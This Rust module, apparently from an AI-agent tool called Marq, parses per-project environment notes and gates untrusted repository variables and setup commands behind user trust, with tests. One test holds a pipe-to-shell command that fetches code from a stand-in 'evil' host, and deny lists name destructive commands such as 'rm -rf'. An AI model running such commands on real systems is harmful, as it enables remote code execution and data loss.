//! Environment notes: how a project runs next to other sessions, kept as Markdown.
//!
//! ```markdown
//! ---
//! type: environment
//! title: "marq dev"
//! project: ~/dev/git/marq        # a vault note only; a repository's own file is for its project
//! ports: [web, api]              # MARQ_PORT_WEB, MARQ_PORT_API (the first of the session's four ports, and so on)
//! vars:
//!   DATABASE_URL: "postgres://localhost/app_{id}"   # {id} is the session's short id
//! ---
//! ## Rules
//! - Start the dev server on $MARQ_PORT_WEB.
//! - Never deploy without asking.
//! ```
//!
//! The text goes into the session's system prompt. `ports:` names some of the session's reserved
//! ports and `vars:` sets environment variables, both for the agent's process.
//!
//! There are two places for it. A repository's `.marq/environment.md` is shared with whoever clones
//! it and wins; otherwise a vault note of `type: environment` for the project (or for no project)
//! is used. A repository is not trusted to set variables on its own: `PATH`, `NODE_OPTIONS` or
//! `ANTHROPIC_BASE_URL` in a cloned repository's file would take over the agent's process. Its `vars:`
//! are shown to the agent as text instead, and the agent sets them itself where needed, in a command
//! the usual permissions apply to. Ports are only named, so they are always safe to take from it.
//!
//! `ask:` and `deny:` list Bash commands to stop (see `sidecar/rules.ts`): a command that contains one
//! of the `deny` strings is refused, and one with an `ask` string waits for the user's approval even
//! in Auto mode. They only restrict, so a repository's rules apply without being trusted.
//!
//! ```yaml
//! ask: ["wrangler deploy", "db:migrate"]
//! deny: ["rm -rf", "docker compose down"]
//! ```
//!
//! `resources:` names what a worktree cannot isolate, such as a database, and how to make one for
//! each session and remove it again (see `resources`):
//!
//! ```yaml
//! resources:
//!   db:
//!     create: createdb app_{id}              # run before the agent starts
//!     drop: dropdb --if-exists app_{id}      # run when the session is done or deleted
//!     env:
//!       DATABASE_URL: postgres://localhost/app_{id}
//! ```
//!
//! Both commands must contain `{id}`, so that one session cannot create or drop another's (or the
//! shared) resource, and should be safe to run twice. Marq runs them itself, so they need the same
//! trust as variables.
//!
//! The user can trust a repository's variables and commands (New task asks). That is remembered in
//! `~/.marq/trusted-environments.json` as the project and the exact variables and commands trusted, so a
//! change to them asks again.

use std::path::{Path, PathBuf};

use serde::Serialize;

use crate::error::Result;
use crate::{knowledge, memory, vault};

/// A repository's environment note, relative to the project.
pub const FILE: &str = ".marq/environment.md";
/// The `type` of a vault note that describes an environment.
pub const KIND: &str = "environment";
/// A session reserves this many ports, so this many can be named.
pub const MAX_PORTS: usize = 4;
/// Most `ask` and `deny` entries each.
const MAX_RULES: usize = 50;

/// Something made for a session and removed after it, from `resources:`.
#[derive(Debug, Clone, PartialEq)]
pub struct Resource {
    pub name: String,
    pub create: String,
    pub drop: String,
    /// Set in the agent's environment once the resource exists. Unexpanded: `{id}` is still in the values.
    pub env: Vec<(String, String)>,
}

#[derive(Debug, Clone, Default, PartialEq)]
pub struct Environment {
    /// Where it was read from, for the agent and the user to see.
    pub source: String,
    /// Upper-case names: `web` is `MARQ_PORT_WEB`.
    pub ports: Vec<String>,
    /// Unexpanded: `{id}` is still in the values.
    pub vars: Vec<(String, String)>,
    pub resources: Vec<Resource>,
    /// Commands that wait for the user's approval, and commands that are refused.
    pub ask: Vec<String>,
    pub deny: Vec<String>,
    /// Resources that were left out and why, so that the agent and the user are not left guessing.
    pub invalid: Vec<String>,
    /// Whether `vars` may be set and `resources` made: a vault note is the user's own, a repository's file has to be trusted.
    pub trusted: bool,
    /// From a repository's file rather than a vault note.
    pub from_repo: bool,
    pub body: String,
}

fn port_name(raw: &str) -> Option<String> {
    let n: String = raw.trim().to_uppercase().chars().filter(|c| c.is_ascii_alphanumeric() || *c == '_').collect();
    (!n.is_empty()).then_some(n)
}

fn var_name_ok(name: &str) -> bool {
    let mut c = name.chars();
    c.next().is_some_and(|f| f.is_ascii_alphabetic() || f == '_') && c.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn vars_of(fm: &str) -> Vec<(String, String)> {
    use yaml_rust2::{Yaml, YamlLoader};
    let Some(doc) = YamlLoader::load_from_str(fm).ok().and_then(|d| d.into_iter().next()) else { return vec![] };
    let Yaml::Hash(map) = &doc["vars"] else { return vec![] };
    map.iter()
        .filter_map(|(k, v)| {
            let k = k.as_str()?;
            let v = match v {
                Yaml::String(s) => s.clone(),
                Yaml::Integer(n) => n.to_string(),
                Yaml::Boolean(b) => b.to_string(),
                _ => return None,
            };
            var_name_ok(k).then(|| (k.to_string(), v))
        })
        .collect()
}

fn str_of(y: &yaml_rust2::Yaml) -> Option<String> {
    use yaml_rust2::Yaml;
    match y {
        Yaml::String(s) => Some(s.clone()),
        Yaml::Integer(n) => Some(n.to_string()),
        Yaml::Boolean(b) => Some(b.to_string()),
        _ => None,
    }
}

fn resource_name_ok(name: &str) -> bool {
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

fn resources_of(fm: &str) -> (Vec<Resource>, Vec<String>) {
    use yaml_rust2::{Yaml, YamlLoader};
    let Some(doc) = YamlLoader::load_from_str(fm).ok().and_then(|d| d.into_iter().next()) else { return Default::default() };
    let Yaml::Hash(map) = &doc["resources"] else { return Default::default() };
    let (mut ok, mut bad) = (vec![], vec![]);
    for (k, v) in map {
        let Some(name) = k.as_str().filter(|n| resource_name_ok(n)) else { continue };
        let create = str_of(&v["create"]).unwrap_or_default();
        let drop = str_of(&v["drop"]).unwrap_or_default();
        if create.trim().is_empty() || drop.trim().is_empty() {
            bad.push(format!("{name}: it needs both create and drop"));
        } else if !create.contains("{id}") || !drop.contains("{id}") {
            // Without the id a command would act on a resource every session shares.
            bad.push(format!("{name}: create and drop must both contain {{id}}"));
        } else {
            let env = match &v["env"] {
                Yaml::Hash(h) => h.iter().filter_map(|(k, v)| Some((k.as_str()?.to_string(), str_of(v)?))).filter(|(k, _)| var_name_ok(k)).collect(),
                _ => vec![],
            };
            ok.push(Resource { name: name.to_string(), create, drop, env });
        }
    }
    (ok, bad)
}

/// A rule list: trimmed, without empty or very long entries, and at most `MAX_RULES`.
fn rules_of(text: &str, key: &str) -> Vec<String> {
    let mut out: Vec<String> = vec![];
    for r in vault::fm_list(text, key).into_iter().map(|r| r.trim().to_string()) {
        if !r.is_empty() && r.chars().count() <= 200 && !out.contains(&r) && out.len() < MAX_RULES {
            out.push(r);
        }
    }
    out
}

/// An environment note's text. A note without frontmatter is all body.
pub fn parse(text: &str, source: &str, trusted: bool) -> Environment {
    let (fm, body) = vault::split_frontmatter(text);
    let mut ports: Vec<String> = vec![];
    for p in vault::fm_list(text, "ports").iter().filter_map(|p| port_name(p)) {
        if !ports.contains(&p) && ports.len() < MAX_PORTS {
            ports.push(p);
        }
    }
    let body = memory::clip(&memory::without_comments(body));
    let (resources, invalid) = fm.map(resources_of).unwrap_or_default();
    Environment { source: source.into(), ports, vars: fm.map(vars_of).unwrap_or_default(), resources, ask: rules_of(text, "ask"), deny: rules_of(text, "deny"), invalid, trusted, from_repo: false, body }
}

/// Where the variables the user trusted are remembered.
fn trust_file() -> PathBuf {
    dirs::home_dir().unwrap_or_default().join(".marq/trusted-environments.json")
}

/// The variables and commands as one string, to tell whether they are the ones that were trusted.
fn trust_key(e: &Environment) -> String {
    let mut lines: Vec<String> = e.vars.iter().map(|(k, v)| format!("{k}={v}")).collect();
    for r in &e.resources {
        lines.push(format!("resource {} create: {}", r.name, r.create));
        lines.push(format!("resource {} drop: {}", r.name, r.drop));
        lines.extend(r.env.iter().map(|(k, v)| format!("resource {} env {k}={v}", r.name)));
    }
    lines.sort();
    lines.join("\n")
}

fn trusted_vars(file: &Path, project: &str) -> Option<String> {
    let map: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(file).ok()?).ok()?;
    map[knowledge::norm(project)].as_str().map(str::to_string)
}

/// Remembers that the user trusts the variables in `project`'s environment file as they are now.
pub fn trust_in(file: &Path, project: &str) -> Result<()> {
    let text = std::fs::read_to_string(vault::expand_home(project).join(FILE))?;
    let key = trust_key(&parse(&text, FILE, false));
    let mut map: serde_json::Value = std::fs::read_to_string(file).ok().and_then(|t| serde_json::from_str(&t).ok()).unwrap_or_else(|| serde_json::json!({}));
    map[knowledge::norm(project)] = serde_json::Value::String(key);
    if let Some(dir) = file.parent() {
        std::fs::create_dir_all(dir)?;
    }
    std::fs::write(file, map.to_string())?;
    Ok(())
}

pub fn trust(project: &str) -> Result<()> {
    trust_in(&trust_file(), project)
}

/// The environment for a session on `project`: the repository's file, else the vault note for it.
pub fn load(vault: &Path, project: &str) -> Option<Environment> {
    load_with(vault, project, &trust_file())
}

fn load_with(vault: &Path, project: &str, trust: &Path) -> Option<Environment> {
    if let Ok(text) = std::fs::read_to_string(vault::expand_home(project).join(FILE)) {
        let mut e = parse(&text, &format!("{FILE} in the repository"), false);
        e.from_repo = true;
        e.trusted = (e.vars.is_empty() && e.resources.is_empty()) || trusted_vars(trust, project).is_some_and(|k| k == trust_key(&e));
        return Some(e);
    }
    let p = knowledge::norm(project);
    let mut general = None;
    for f in vault::list_files(vault).into_iter().filter(|f| f.kind.as_deref() == Some(KIND)) {
        let Ok(text) = std::fs::read_to_string(&f.path) else { continue };
        let np = vault::fm_get(&text, "project").unwrap_or_default();
        if np.is_empty() {
            general.get_or_insert_with(|| parse(&text, &f.rel, true));
        } else if knowledge::norm(&np) == p {
            return Some(parse(&text, &f.rel, true));
        }
    }
    general
}

const FIELDS: &str = "# ports: [web, api]          # MARQ_PORT_WEB and MARQ_PORT_API: names for the ports reserved for each session
# vars:                        # set in the agent's environment ({id} is the session's short id)
#   DATABASE_URL: \"postgres://localhost/app_{id}\"
";

const RULES: &str = "<!-- Everything below goes into the system prompt of each session on the project, so keep it short.
     This comment is not sent. For example:

     - Start the dev server on $MARQ_PORT_WEB, never on 3000.
     - Never deploy without asking. A migration runs on the shared database: check its state before you repeat one.
-->
## Rules
";

/// A vault note for `project`, created with the fields commented out so it can be filled in.
pub fn ensure_note(vault: &Path, project: &str) -> Result<PathBuf> {
    let name: String = vault::expand_home(project)
        .file_name()
        .map(|n| n.to_string_lossy().chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').collect())
        .unwrap_or_default();
    let name = if name.is_empty() { "default".to_string() } else { name };
    let path = vault.join("environments").join(format!("{name}.md"));
    if !path.exists() {
        std::fs::create_dir_all(path.parent().unwrap())?;
        let project_line = if project.trim().is_empty() { String::new() } else { format!("project: {}\n", project.trim()) };
        std::fs::write(&path, format!("---\ntype: {KIND}\ntitle: \"{name} environment\"\n{project_line}{FIELDS}---\n{RULES}"))?;
    }
    Ok(path)
}

/// The project's own `.marq/environment.md`, created the same way, to be committed with the code.
pub fn ensure_repo_file(project: &str) -> Result<PathBuf> {
    let root = vault::expand_home(project);
    if project.trim().is_empty() || !root.is_dir() {
        return Err(crate::error::Error::Other(format!("not a directory: {project}")));
    }
    let path = root.join(FILE);
    if !path.exists() {
        std::fs::create_dir_all(path.parent().unwrap())?;
        std::fs::write(&path, format!("---\n{FIELDS}---\n{RULES}"))?;
    }
    Ok(path)
}

/// What New task shows about the environment of a project.
#[derive(Debug, Serialize)]
pub struct Status {
    pub source: String,
    pub from_repo: bool,
    pub ports: Vec<String>,
    pub vars: Vec<(String, String)>,
    /// Name, create and drop of each resource.
    pub resources: Vec<(String, String, String)>,
    pub trusted: bool,
}

pub fn status(vault: &Path, project: &str) -> Option<Status> {
    let e = load(vault, project)?;
    let resources = e.resources.into_iter().map(|r| (r.name, r.create, r.drop)).collect();
    Some(Status { source: e.source, from_repo: e.from_repo, ports: e.ports, vars: e.vars, resources, trusted: e.trusted })
}

/// `{id}` replaced by the session's short id.
pub fn expand(value: &str, short: &str) -> String {
    value.replace("{id}", short)
}

/// The system prompt addition: the note's text, the names of its ports and, for a repository's file,
/// the variables it asks for.
pub fn system_prompt(env: &Environment, short: &str) -> String {
    let mut out = format!("\n\nEnvironment for this project ({}). Follow it:", env.source);
    if !env.body.is_empty() {
        out.push_str(&format!("\n{}", env.body));
    }
    if !env.ports.is_empty() {
        let names: Vec<String> = env.ports.iter().map(|p| format!("${{MARQ_PORT_{p}}}")).collect();
        out.push_str(&format!("\nPorts reserved for you by name: {}.", names.join(", ")));
    }
    if !env.resources.is_empty() {
        let names: Vec<&str> = env.resources.iter().map(|r| r.name.as_str()).collect();
        out.push_str(&if env.trusted {
            format!(
                "\nMarq made these for this session before you started and removes them when it is done: {}. Use them, and do not create or drop them yourself.",
                names.join(", ")
            )
        } else {
            format!("\nThe file lists resources ({}) that Marq has not made: the user has not trusted its commands. Do not assume they exist.", names.join(", "))
        });
    }
    if !env.deny.is_empty() {
        out.push_str(&format!("\nDo not run commands that contain any of: {}.", env.deny.iter().map(|r| format!("`{r}`")).collect::<Vec<_>>().join(", ")));
    }
    if !env.ask.is_empty() {
        out.push_str(&format!(
            "\nAsk the user before running commands that contain any of: {}.",
            env.ask.iter().map(|r| format!("`{r}`")).collect::<Vec<_>>().join(", ")
        ));
    }
    if !env.invalid.is_empty() {
        out.push_str(&format!("\nThese resources were left out: {}.", env.invalid.join("; ")));
    }
    if !env.trusted && !env.vars.is_empty() {
        let lines: Vec<String> = env.vars.iter().map(|(k, v)| format!("- {k}={}", expand(v, short))).collect();
        out.push_str(&format!(
            "\nThe file asks for these variables. They are not set for you: set them in the commands that need them.\n{}",
            lines.join("\n")
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOTE: &str = "---\ntype: environment\nports: [web, api, web, \"d b\", a, b]\nvars:\n  DATABASE_URL: \"postgres://localhost/app_{id}\"\n  BAD-NAME: x\n  PORT: 8080\n---\n<!-- hidden -->\n## Rules\n- Never deploy.\n";

    #[test]
    fn reads_ports_vars_and_the_body() {
        let e = parse(NOTE, "n.md", true);
        // Duplicates are dropped, names are cleaned and at most four are kept.
        assert_eq!(e.ports, ["WEB", "API", "DB", "A"]);
        assert_eq!(e.vars, [("DATABASE_URL".to_string(), "postgres://localhost/app_{id}".to_string()), ("PORT".to_string(), "8080".to_string())]);
        assert!(e.body.contains("Never deploy") && !e.body.contains("hidden"));
        assert_eq!(expand(&e.vars[0].1, "abc12345"), "postgres://localhost/app_abc12345");
    }

    #[test]
    fn a_new_note_is_valid_and_empty_and_is_not_overwritten() {
        let vault = tempfile::tempdir().unwrap();
        let path = ensure_note(vault.path(), "~/dev/git/my app").unwrap();
        assert!(path.ends_with("environments/myapp.md"));
        let text = std::fs::read_to_string(&path).unwrap();
        assert_eq!(vault::fm_get(&text, "type").as_deref(), Some(KIND));
        assert_eq!(vault::fm_get(&text, "project").as_deref(), Some("~/dev/git/my app"));
        let e = parse(&text, "n.md", true);
        assert!(e.ports.is_empty() && e.vars.is_empty());
        assert_eq!(e.body, "## Rules");
        std::fs::write(&path, "mine").unwrap();
        ensure_note(vault.path(), "~/dev/git/my app").unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "mine");
        assert!(ensure_note(vault.path(), "").unwrap().ends_with("environments/default.md"));
    }

    #[test]
    fn a_new_repository_file_is_empty_and_needs_a_directory() {
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        let path = ensure_repo_file(&project).unwrap();
        assert!(path.ends_with(".marq/environment.md"));
        let e = parse(&std::fs::read_to_string(&path).unwrap(), "f", false);
        assert!(e.ports.is_empty() && e.vars.is_empty() && e.body == "## Rules");
        assert!(ensure_repo_file("").is_err() && ensure_repo_file("/no/such/dir").is_err());
    }

    #[test]
    fn reads_ask_and_deny_rules() {
        let e = parse("---\nask: [\"wrangler deploy\", \" db:migrate \", \"\", \"wrangler deploy\"]\ndeny: [rm -rf]\n---\n", "f", false);
        assert_eq!(e.ask, ["wrangler deploy", "db:migrate"]);
        assert_eq!(e.deny, ["rm -rf"]);
        // They only restrict, so a repository's rules are used although it is not trusted.
        let p = system_prompt(&e, "abc12345");
        assert!(p.contains("Do not run commands that contain any of: `rm -rf`") && p.contains("Ask the user before"));
    }

    #[test]
    fn a_note_without_frontmatter_is_all_body() {
        let e = parse("Start it with make dev.\n", "n.md", false);
        assert!(e.ports.is_empty() && e.vars.is_empty());
        assert_eq!(e.body, "Start it with make dev.");
    }

    #[test]
    fn a_repository_file_wins_over_a_vault_note() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        std::fs::write(vault.path().join("env.md"), format!("---\ntype: environment\nproject: {project}\n---\nfrom the vault\n")).unwrap();
        let trust = vault.path().join("trust.json");
        let e = load_with(vault.path(), &project, &trust).unwrap();
        assert!(e.trusted && e.body == "from the vault");
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        std::fs::write(repo.path().join(FILE), "from the repository\n").unwrap();
        let e = load_with(vault.path(), &project, &trust).unwrap();
        assert!(e.from_repo && e.body == "from the repository");
    }

    #[test]
    fn trusting_a_repositorys_variables_holds_until_they_change() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        let trust = vault.path().join("sub/trust.json");
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        let file = repo.path().join(FILE);
        std::fs::write(&file, "---\nvars:\n  A: one\n---\nbody\n").unwrap();
        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
        trust_in(&trust, &project).unwrap();
        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
        // Editing the text around the variables does not ask again; changing a variable does.
        std::fs::write(&file, "---\nvars:\n  A: one\n---\nnew body\n").unwrap();
        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
        std::fs::write(&file, "---\nvars:\n  A: two\n---\nnew body\n").unwrap();
        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
        // A file without variables has nothing to trust.
        std::fs::write(&file, "just text\n").unwrap();
        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
    }

    #[test]
    fn a_vault_note_for_another_project_is_not_used() {
        let vault = tempfile::tempdir().unwrap();
        std::fs::write(vault.path().join("env.md"), "---\ntype: environment\nproject: /somewhere/else\n---\nno\n").unwrap();
        assert!(load(vault.path(), "/not/it").is_none());
    }

    #[test]
    fn a_repositorys_variables_are_text_not_environment() {
        let e = parse(NOTE, "n.md", false);
        let p = system_prompt(&e, "abc12345");
        assert!(p.contains("DATABASE_URL=postgres://localhost/app_abc12345") && p.contains("not set for you"));
        assert!(!system_prompt(&parse(NOTE, "n.md", true), "abc12345").contains("DATABASE_URL"));
    }

    fn res(yaml: &str) -> (Vec<Resource>, Vec<String>) {
        let e = parse(&format!("---\n{yaml}\n---\n"), "n.md", true);
        (e.resources, e.invalid)
    }

    #[test]
    fn reads_resources_with_their_env() {
        let (r, bad) = res("resources:\n  db:\n    create: createdb app_{id}\n    drop: dropdb app_{id}\n    env:\n      DATABASE_URL: postgres://localhost/app_{id}\n      N: 3\n      BAD-NAME: x\n  cache:\n    create: mkdir /tmp/c_{id}\n    drop: rm -rf /tmp/c_{id}");
        assert!(bad.is_empty(), "{bad:?}");
        assert_eq!(r.len(), 2);
        assert_eq!(r[0].name, "db");
        assert_eq!(r[0].env, [("DATABASE_URL".to_string(), "postgres://localhost/app_{id}".to_string()), ("N".to_string(), "3".to_string())]);
        assert!(r[1].env.is_empty());
    }

    #[test]
    fn a_resource_needs_create_drop_and_the_id_in_both() {
        let (r, bad) = res("resources:\n  a:\n    create: make {id}\n  b:\n    drop: rm {id}\n  c:\n    create: make\n    drop: rm {id}\n  d:\n    create: make {id}\n    drop: rm\n  e:\n    create: \"  \"\n    drop: rm {id}\n  ok:\n    create: make {id}\n    drop: rm {id}");
        assert_eq!(r.iter().map(|r| r.name.as_str()).collect::<Vec<_>>(), ["ok"]);
        assert_eq!(bad.len(), 5, "{bad:?}");
        assert!(bad.iter().any(|b| b.starts_with("a:") && b.contains("both create and drop")));
        assert!(bad.iter().any(|b| b.starts_with("c:") && b.contains("{id}")));
    }

    #[test]
    fn resource_names_and_shapes_that_make_no_sense_are_skipped() {
        let (r, bad) = res("resources:\n  \"bad name\":\n    create: make {id}\n    drop: rm {id}\n  \"a/b\":\n    create: make {id}\n    drop: rm {id}\n  list: [1, 2]");
        assert!(r.is_empty());
        // A name that is not usable is skipped silently; a usable name with no commands is reported.
        assert_eq!(bad.len(), 1);
        assert!(bad[0].starts_with("list:"));
        assert!(res("resources: nope").0.is_empty());
        assert!(res("resources:").0.is_empty());
        assert!(res("ports: [a]").0.is_empty());
    }

    #[test]
    fn broken_yaml_gives_no_vars_or_resources() {
        let e = parse("---\nvars: [unclosed\nresources: {\n---\nbody\n", "n.md", true);
        assert!(e.vars.is_empty() && e.resources.is_empty());
        assert_eq!(e.body, "body");
    }

    #[test]
    fn a_numeric_or_boolean_command_is_read_as_text() {
        let (r, _) = res("resources:\n  n:\n    create: 1{id}\n    drop: true{id}");
        assert_eq!(r.len(), 1);
    }

    #[test]
    fn vars_take_scalars_and_skip_the_rest() {
        let e = parse("---\nvars:\n  A: text\n  B: 5\n  C: true\n  D: [1]\n  E:\n    x: 1\n  1BAD: x\n  _OK: y\n  F: 1.5\n---\n", "n.md", true);
        let names: Vec<&str> = e.vars.iter().map(|(k, _)| k.as_str()).collect();
        assert_eq!(names, ["A", "B", "C", "_OK"]);
        assert_eq!(e.vars[2].1, "true");
        assert!(parse("---\nvars: nope\n---\n", "n", true).vars.is_empty());
    }

    #[test]
    fn port_names_are_cleaned() {
        let e = parse("---\nports: [Web, \"my-api\", \"  \", \"!!!\", db_2]\n---\n", "n", true);
        assert_eq!(e.ports, ["WEB", "MYAPI", "DB_2"]);
        assert!(parse("---\nports: [a, b, c, d, e, f]\n---\n", "n", true).ports.len() == MAX_PORTS);
    }

    #[test]
    fn rules_are_capped_and_long_ones_dropped() {
        let many: Vec<String> = (0..80).map(|i| format!("\"cmd{i}\"")).collect();
        let long = "x".repeat(201);
        let text = format!("---\nask: [{}, \"{long}\"]\ndeny: [{}]\n---\n", many.join(", "), many.join(", "));
        let e = parse(&text, "n", false);
        assert_eq!(e.ask.len(), MAX_RULES);
        assert_eq!(e.deny.len(), MAX_RULES);
        assert!(!e.ask.contains(&long));
        let edge = format!("---\nask: [\"{}\"]\n---\n", "y".repeat(200));
        assert_eq!(parse(&edge, "n", false).ask.len(), 1);
    }

    #[test]
    fn expand_replaces_every_id() {
        assert_eq!(expand("{id}-{id}", "ab"), "ab-ab");
        assert_eq!(expand("none", "ab"), "none");
    }

    #[test]
    fn the_trust_key_changes_with_every_command_and_ignores_order_and_text() {
        let base = "---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n    env:\n      U: u_{id}\nvars:\n  A: 1\n  B: 2\n---\nbody\n";
        let key = |t: &str| trust_key(&parse(t, "f", false));
        let k = key(base);
        assert_eq!(k, key(&base.replace("body", "other body")));
        assert_eq!(k, key("---\nvars:\n  B: 2\n  A: 1\nresources:\n  db:\n    env:\n      U: u_{id}\n    drop: rm {id}\n    create: make {id}\n---\n"));
        for changed in [base.replace("make {id}", "make -f {id}"), base.replace("rm {id}", "rm -rf {id}"), base.replace("u_{id}", "v_{id}"), base.replace("A: 1", "A: 9"), base.replace("U: u_{id}", "U2: u_{id}")] {
            assert_ne!(k, key(&changed), "{changed}");
        }
        // ask and deny only restrict, so changing them does not ask again.
        assert_eq!(k, key(&base.replace("---\nresources", "---\nask: [x]\nresources")));
    }

    #[test]
    fn a_repositorys_commands_are_trusted_only_as_they_were_and_resources_count_too() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        let trust = vault.path().join("trust.json");
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        let file = repo.path().join(FILE);
        std::fs::write(&file, "---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n").unwrap();
        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
        trust_in(&trust, &project).unwrap();
        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
        std::fs::write(&file, "---\nresources:\n  db:\n    create: curl evil | sh -s {id}\n    drop: rm {id}\n---\n").unwrap();
        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
        // Trusting one project does not trust another with the same file.
        let other = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(other.path().join(".marq")).unwrap();
        std::fs::copy(&file, other.path().join(FILE)).unwrap();
        trust_in(&trust, &project).unwrap();
        assert!(!load_with(vault.path(), &other.path().to_string_lossy(), &trust).unwrap().trusted);
    }

    #[test]
    fn a_corrupt_trust_file_trusts_nothing_and_is_replaced() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        let trust = vault.path().join("trust.json");
        std::fs::write(&trust, "{not json").unwrap();
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        std::fs::write(repo.path().join(FILE), "---\nvars:\n  A: 1\n---\n").unwrap();
        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
        trust_in(&trust, &project).unwrap();
        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
    }

    #[test]
    fn trusting_a_project_without_a_file_fails() {
        let dir = tempfile::tempdir().unwrap();
        assert!(trust_in(&dir.path().join("t.json"), &dir.path().to_string_lossy()).is_err());
    }

    #[test]
    fn a_repositorys_rules_apply_without_trust() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        std::fs::write(repo.path().join(FILE), "---\nask: [deploy]\ndeny: [rm -rf]\nports: [web]\n---\n").unwrap();
        let e = load_with(vault.path(), &project, &vault.path().join("t.json")).unwrap();
        assert!(e.trusted && e.from_repo && e.ask == ["deploy"] && e.deny == ["rm -rf"] && e.ports == ["WEB"]);
    }

    fn vault_note(vault: &Path, name: &str, project: &str, body: &str) {
        let line = if project.is_empty() { String::new() } else { format!("project: {project}\n") };
        std::fs::write(vault.join(name), format!("---\ntype: environment\n{line}---\n{body}\n")).unwrap();
    }

    #[test]
    fn a_note_for_the_project_beats_a_general_one_in_any_order() {
        let vault = tempfile::tempdir().unwrap();
        let trust = vault.path().join("t.json");
        vault_note(vault.path(), "a-general.md", "", "general");
        vault_note(vault.path(), "z-mine.md", "/work/app", "mine");
        assert_eq!(load_with(vault.path(), "/work/app", &trust).unwrap().body, "mine");
        assert_eq!(load_with(vault.path(), "/work/other", &trust).unwrap().body, "general");
        assert_eq!(load_with(vault.path(), "", &trust).unwrap().body, "general");
    }

    #[test]
    fn other_notes_are_not_environments() {
        let vault = tempfile::tempdir().unwrap();
        std::fs::write(vault.path().join("n.md"), "---\ntype: memory\n---\nno\n").unwrap();
        assert!(load_with(vault.path(), "/work/app", &vault.path().join("t.json")).is_none());
    }

    #[test]
    fn a_vault_note_is_trusted_and_a_repository_file_with_nothing_to_trust_is_too() {
        let vault = tempfile::tempdir().unwrap();
        vault_note(vault.path(), "n.md", "/p", "x");
        let e = load_with(vault.path(), "/p", &vault.path().join("t.json")).unwrap();
        assert!(e.trusted && !e.from_repo);
    }

    #[test]
    fn a_repository_with_commands_waits_for_trust() {
        let vault = tempfile::tempdir().unwrap();
        let repo = tempfile::tempdir().unwrap();
        let project = repo.path().to_string_lossy().to_string();
        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
        std::fs::write(repo.path().join(FILE), "---\nports: [web]\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n").unwrap();
        let e = load_with(vault.path(), &project, &vault.path().join("t.json")).unwrap();
        assert!(e.from_repo && !e.trusted && e.resources.len() == 1);
    }

    #[test]
    fn the_prompt_says_what_was_made_and_what_was_left_out() {
        let trusted = parse("---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n  bad:\n    create: make\n    drop: rm\n---\n", "n.md", true);
        let p = system_prompt(&trusted, "abc12345");
        assert!(p.contains("Marq made these") && p.contains("db") && p.contains("do not create or drop them"));
        assert!(p.contains("left out") && p.contains("bad:"));
        let untrusted = parse("---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n", "n.md", false);
        let p = system_prompt(&untrusted, "abc12345");
        assert!(p.contains("has not made") && p.contains("Do not assume they exist") && !p.contains("Marq made these"));
    }

    #[test]
    fn the_prompt_names_ports_and_the_source() {
        let e = parse("---\nports: [web, api]\n---\nText\n", "environments/app.md", true);
        let p = system_prompt(&e, "x");
        assert!(p.contains("environments/app.md") && p.contains("${MARQ_PORT_WEB}, ${MARQ_PORT_API}") && p.contains("Text"));
        let bare = system_prompt(&parse("", "f", true), "x");
        assert!(!bare.contains("Ports") && !bare.contains("Marq made") && !bare.contains("Do not run"));
    }

    #[test]
    fn the_prompt_lists_every_rule() {
        let e = parse("---\nask: [a b, c]\ndeny: [d]\n---\n", "f", false);
        let p = system_prompt(&e, "x");
        assert!(p.contains("`a b`, `c`") && p.contains("`d`"));
    }
}
